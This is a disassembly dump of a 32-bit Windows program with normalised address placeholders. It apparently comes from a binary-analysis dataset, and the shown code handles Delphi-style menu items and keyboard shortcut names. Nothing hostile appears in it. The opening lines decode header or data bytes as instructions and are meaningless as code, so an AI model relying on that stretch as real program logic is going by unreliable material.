or al 0x0
sbb al 0xd3
inc esp
add [ eax ] cl
add bh bh
xchg esp eax
cmp eax 0x10045
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
push es
dec ecx
insd
popad
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
add al dl
outsb
jo r-xdata
jle r-xdata
test [ fs : eax + eax + 0x14 ] 0xd0000000
add [ eax ] dh
add bh bh
jo r-xdata
adc [ eax ] al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x44f7 0x0
or [ eax ] al
add [ eax ] al
jo r-xdata
inc ebx
push 0x65676e61
dec esp
jns r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9c65646f
inc esp
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
xor [ edi - 0x586bffbe ] ah
inc edx
add [ edi + 0x42 ] dh
add [ eax - 0x59 ] ah
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
imul esi [ ebx + 0x74 ] 0x44f7bc90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
test [ eax + eax + 0x8 ] 0xf0000000
movsd [ edi ] [ esi ]
inc edx
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
mov esp 0x44f7
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
mov esp 0x600041a0
mov [ 0xffffffffa4480041 ] al
inc ecx
add [ eax ] dl
mov eax [ 0xffffffffa18c0041 ]
inc ecx
add [ eax ] dl
inc esp
inc ebp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc esp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
je r-xdata
rcl [ eax - 0x9 ] 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 8 + 0x44 ] ah
add [ eax + eax ] dl
add [ eax ] al
sar [ esi + 0x41 ] 0x1
test ebx ebx
je r-xdata
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_444498
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_44f808
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_43ec3c
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_444498
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_44f860
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_44f898
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_403f9c
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_40420c
sub_44f8ec
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_44fad5
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404034
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_404184
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404034
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_404034
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_404184
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_404184
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_403f9c
mov eax esi
call sub_403f9c
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_404034
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_4082b4
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4042a8
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_44f898
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404264
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404034
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404264
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_404264
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404264
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fadc
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403fc0
retn
sub_44faf0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_40425c
push eax
mov eax edi
call sub_40425c
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40425c
push eax
mov eax edi
call sub_40445c
push eax
mov eax [ esi ]
call sub_40445c
pop edx
pop ecx
call sub_408194
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_40425c
mov ecx eax
mov eax esi
mov edx 0x1
call sub_4044fc
sub_44fb4c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40444c
xor eax eax
push ebp
push sub_44fc27
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_44faf0
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44faf0
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44faf0
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44faf0
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fc2e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc0
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_44f8ec
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408144
test eax eax
jne r-xdata
sub_44fc64
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_452204
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_452214
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_44fcc4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_452204
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_452204
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_452214
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_452214
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_44fc64
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_44fc64
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_452214
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_452214
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_44fe10
push ebx
mov ebx eax
mov eax ebx
call sub_44c9b8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_454dc8
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_44fe48
push ebx
mov ebx eax
mov eax ebx
call sub_44c9cc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44fe78
push ebx
mov ebx eax
mov eax ebx
call sub_44c9e0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44fea8
push ebx
mov ebx eax
mov eax ebx
call sub_44ca08
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44fed8
push ebx
mov ebx eax
mov eax ebx
call sub_44ca30
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_4043a8
je r-xdata
mov al 0x1
pop ebx
retn
sub_44ff0c
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_44c9f4
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_44ff48
push ebx
mov ebx eax
mov eax ebx
call sub_44ca44
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44ff7c
push ebx
mov ebx eax
mov eax ebx
call sub_44ca58
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44ffb0
push ebx
mov ebx eax
mov eax ebx
call sub_44ca6c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44ffe4
push ebx
mov ebx eax
mov eax ebx
call sub_4204c8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45000c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_45002c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45206c
sub_45004c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4520dc
sub_45006c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_452130
sub_45008c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_4500a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_403ff0
sub_4500cc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45225c
sub_4500ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_452238
sub_45010c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45224c
sub_45012a
mov eax eax
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_450158
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41fbd8
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_44fc44
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_452b68
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4501d4
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_454bac
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_452204
test eax eax
jg r-xdata
mov edx esi
call sub_45259c
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_452214
call sub_40324c
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_40324c
lea eax [ esi + 0x44 ]
call sub_40d420
lea eax [ esi + 0x78 ]
call sub_40d420
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_4505f0
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_41a70c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41fc24
test bl bl
jle r-xdata
call sub_40324c
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_450288
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4504e3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4504ea
lea eax [ ebp - 0x40 ]
call sub_403f9c
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_404034
mov eax ebx
call sub_452204
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_450798
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_4043a8
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_452204
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_4527c0
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_44f8ec
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_40431c
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_40445c
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_40445c
push eax
mov eax ebx
call sub_450798
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033d8
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_451ddc
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_4043a8
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_40445c
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_452204
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_450798
mov [ ebp - 0x25 ] eax
sub_450503
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_450288
xor eax eax
pop ebp
retn
sub_450528
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_453dfc
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_452dc4
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4532c0
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_44fcc4
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_450598
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4505e2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41ed08
mov eax [ ebp - 0x4 ]
call sub_44fb4c
mov edx eax
mov eax ebx
call sub_452238
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4505e9
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_4505f0
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_450668
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_41fca8
sub_45062c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_420028
mov eax ebx
call sub_4521ec
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_4521ec
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403448
pop esi
pop ebx
retn
mov eax ebx
call sub_450668
sub_450668
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_450798
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_450668
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_450798
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_450798
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_450528
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax ebp
call sub_450798
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_450738
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_452204
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_452214
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_452214
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_452214
